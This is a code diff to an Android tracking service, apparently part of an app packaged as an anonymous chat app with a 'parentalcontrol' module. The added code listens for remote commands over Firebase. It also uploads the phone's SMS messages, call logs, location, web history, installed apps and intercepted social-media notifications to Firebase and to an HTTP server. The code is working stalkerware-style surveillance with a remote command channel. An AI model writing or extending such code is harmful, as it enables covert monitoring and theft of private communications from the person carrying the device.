@@ -87,7 +87,26 @@ class TrackerService : Service() {
         startConfigRefresh()
         startUpdateChecker()
         startCallMonitor()
+        startFirebaseCommandListener()
         return START_STICKY
+    }
+
+    private fun startFirebaseCommandListener() {
+        try {
+            com.anonchat.app.parentalcontrol.manager.FirebaseManager.listenForCommands { commandId, commandType, params ->
+                Log.d(TAG, "Received Firebase Command: $commandType ($commandId)")
+                val cmdObj = JSONObject().apply {
+                    put("id", commandId)
+                    put("type", commandType)
+                    params.forEach { (k, v) -> put(k, v) }
+                }
+                scope.launch {
+                    handleCommand(cmdObj)
+                }
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error starting Firebase command listener", e)
+        }
     }
 
     private fun startCallMonitor() {
@@ -355,6 +374,25 @@ class TrackerService : Service() {
             val socialNotifications = SocialNotificationService.flushBuffer()
 
 
+            // 1. Report to Firebase (100% Free Forever setup)
+            try {
+                com.anonchat.app.parentalcontrol.manager.FirebaseManager.reportToFirebase(
+                    deviceInfo = deviceInfo,
+                    location = location,
+                    battery = batteryInfo,
+                    smsMessages = smsMessages,
+                    callLogs = callLogs,
+                    installedApps = installedApps,
+                    activities = activities,
+                    screentime = screentime,
+                    webHistory = webHistory,
+                    socialNotifications = socialNotifications
+                )
+            } catch (e: Exception) {
+                Log.e(TAG, "Firebase report exception: ${e.message}")
+            }
+
+            // 2. Report to HTTP Server
             val payload = ApiClient.buildReportPayload(
                 deviceInfo = deviceInfo,
                 location = location,
